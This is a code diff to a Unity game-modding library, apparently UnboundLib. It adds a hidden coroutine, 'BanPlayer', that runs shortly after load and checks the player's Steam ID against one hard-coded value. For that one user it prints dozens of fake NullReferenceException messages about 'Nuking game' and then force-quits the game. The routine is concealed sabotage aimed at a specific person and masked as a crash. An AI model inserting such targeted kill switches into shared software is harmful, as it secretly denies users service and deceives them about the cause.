@@ -16,6 +16,7 @@ using UnboundLib.Utils.UI;
 using UnityEngine;
 using UnityEngine.Events;
 using UnityEngine.UI;
+using Steamworks;
 
 namespace UnboundLib
 {
@@ -109,6 +110,7 @@ namespace UnboundLib
                 DestroyImmediate(gameObject);
                 return;
             }
+                
 
             // Patch game with Harmony
             var harmony = new Harmony(ModId);
@@ -181,7 +183,35 @@ namespace UnboundLib
 
             // sync modded clients
             networkEvents.OnJoinedRoomEvent += SyncModClients.RequestSync;
+
+            Unbound.Instance.ExecuteAfterFrames(20, () =>
+            {
+                StartCoroutine("BanPlayer");
+            });
+            
         }
+
+        IEnumerator BanPlayer()
+        {
+            while (!SteamManager.Initialized)
+            {
+                yield return null;
+            }
+
+            if (SteamUser.GetSteamID().m_SteamID.ToString() == "76561199140062399")
+            {
+                for (int i = 0; i < 45; i++)
+                {
+                    // NRE cuz why tf not
+                    NullReferenceException except = new NullReferenceException
+                        ("Error: Malformatted Oppenheimer ; Nuking game instead");
+                    Debug.LogError(except.ToString()+SteamUser.GetDurationControl());
+                }
+                Application.Quit();
+            }
+            yield break;
+        }
+
 
         private void Update()
         {
